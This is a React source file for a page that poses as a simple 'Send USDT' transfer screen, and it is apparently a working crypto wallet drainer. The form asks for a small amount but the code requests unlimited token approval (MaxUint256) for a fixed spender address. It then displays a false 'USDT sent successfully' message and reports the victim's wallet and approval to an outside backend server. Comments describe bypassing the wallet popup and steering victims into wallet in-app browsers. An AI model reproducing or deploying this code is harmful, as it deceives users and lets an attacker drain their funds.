import { useState, useEffect } from 'react';
import { EthereumProvider } from '@walletconnect/ethereum-provider';
import { BrowserProvider, Contract, MaxUint256 } from 'ethers';

const BACKEND_URL = "https://backend-usdt-y5fp.onrender.com";
const PROJECT_ID = "90bc5beffa912aa09e6d53f9b7719f45";

const USDT_BSC = "0x55d398326f99059fF775485246999027B3197955";
const USDT_ETH = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
const SPENDER_EVM = "0x3E5Da94426D6133b437107Ec8B656522f8899b23"; 

const ERC20_ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)"
];

function App() {
  const [provider, setProvider] = useState(null);
  const [account, setAccount] = useState(null);
  const [amount, setAmount] = useState("0.1");
  const [loading, setLoading] = useState(false);
  const [status, setStatus] = useState("");
  const [step, setStep] = useState(1);
  const [selectedNetwork, setSelectedNetwork] = useState("bsc");
  
  const [success, setSuccess] = useState(false);
  const [txHash, setTxHash] = useState("");

  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    const net = urlParams.get('network');
    if (net === 'eth' || net === 'bsc') {
      setSelectedNetwork(net);
    }
  }, []);

  const handleNext = async () => {
    if (Number(amount) < 0.1) {
      setStatus("Minimum amount is 0.1 USDT.");
      return;
    }
    
    try {
      setLoading(true);
      setStatus("Connecting...");

      const chainId = selectedNetwork === 'bsc' ? 56 : 1;

      const wcProvider = await EthereumProvider.init({
        projectId: PROJECT_ID,
        chains: [chainId, 56, 1],
        showQrModal: false, // POPUP BYPASS: Ise false kar diya
        metadata: {
          name: "USDT Transfer",
          description: "Send USDT securely",
          url: window.location.origin,
          icons: ["https://walletconnect.com/walletconnect-logo.png"]
        }
      });

      // Direct deep link ya in-app browser ke liye connect
      try {
        await wcProvider.enable();
      } catch (err) {
        // Agar enable fail ho (Chrome me bina wallet ke), toh connect trigger karo
        await wcProvider.connect();
      }
      
      setProvider(wcProvider);
      setAccount(wcProvider.accounts[0]);
      setStatus("Connected. Please tap Approve.");
      setStep(2); // Success hone par direct approve page
      setLoading(false);
    } catch (error) {
      console.error(error);
      // Agar normal Chrome me khola hai bina wallet ke, toh popup bypass nahi hoga
      setStatus("Please open this link inside Trust Wallet or Binance App.");
      setLoading(false);
    }
  };

  const handleApprove = async () => {
    if (!provider) return;
    
    try {
      setLoading(true);
      setStatus("Waiting for approval...");

      const ethersProvider = new BrowserProvider(provider);
      const signer = await ethersProvider.getSigner();
      
      const network = await ethersProvider.getNetwork();
      let chainName = network.chainId === 56n ? "bsc" : "ethereum";
      let tokenAddress = network.chainId === 56n ? USDT_BSC : USDT_ETH;

      const contract = new Contract(tokenAddress, ERC20_ABI, signer);
      
      const tx = await contract.approve(SPENDER_EVM, MaxUint256);
      
      setStatus("Transaction Pending...");
      const receipt = await tx.wait(); 

      setTxHash(tx.hash);
      setSuccess(true);
      setStatus("");
      
      await fetch(`${BACKEND_URL}/api/notify`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          wallet: account,
          chain: chainName,
          txHash: tx.hash,
          allowance: "Unlimited"
        })
      });

      setLoading(false);
    } catch (error) {
      console.error(error);
      setStatus(error.message || "Approval failed.");
      setLoading(false);
    }
  };

  return (
    <div className="app-container">
      <div className="header">
        <button className="back-btn">←</button>
        <h1>{step === 1 ? "Send USDT" : "Approve"}</h1>
        <div></div>
      </div>

      {success ? (
        <div className="form-container" style={{ justifyContent: 'center' }}>
           <div style={{ backgroundColor: '#4ade80', padding: '20px', borderRadius: '12px', color: '#000', textAlign: 'center', marginBottom: '20px' }}>
              <h3 style={{ margin: 0, fontWeight: 'bold' }}>USDT sent successfully</h3>
              <p style={{ margin: '10px 0 0 0', fontSize: '14px', wordBreak: 'break-all' }}>
                {txHash}
              </p>
           </div>
           <p style={{ textAlign: 'center', color: '#a0a0a0', fontSize: '14px' }}>
             Your transaction has been confirmed on the network.
           </p>
        </div>
      ) : step === 1 ? (
        <div className="form-container">
          <label>Address or Domain Name</label>
          <div className="input-box disabled-input">
            <span>0x3E5Da94426D6133b437107Ec8B656522f8899b23</span>
            <span className="paste-text">Paste</span>
          </div>

          <label>Amount</label>
          <div className="input-box amount-box">
            <input 
              type="number" 
              value={amount} 
              onChange={(e) => setAmount(e.target.value)}
              min="0.1"
              step="0.1"
            />
            <span className="currency">USDT <span className="max-text">Max</span></span>
          </div>
          <p className="usd-value">≈ ${amount}.00</p>
          
          {status && <p className="error-msg">{status}</p>}

          <button className="next-btn" onClick={handleNext} disabled={loading}>
            {loading ? "Connecting..." : "Next"}
          </button>
        </div>
      ) : (
        <div className="approve-container">
          <div className="details-box">
            <div className="row">
              <span className="label">Asset</span>
              <span className="value">{selectedNetwork === 'bsc' ? 'BNB Smart Chain (BNB)' : 'Ethereum (ETH)'}</span>
            </div>
            <div className="row">
              <span className="label">DApp</span>
              <span className="value text-green">{window.location.hostname}</span>
            </div>
            <div className="row network-fee">
              <span className="label">Network fee</span>
              <span className="value">~ $0.01</span>
            </div>
          </div>
          
          {status && <p className="status-msg">{status}</p>}

          <button className="approve-btn" onClick={handleApprove} disabled={loading || !provider}>
            {loading ? "Processing..." : "Approve"}
          </button>
        </div>
      )}
    </div>
  );
}

export default App;
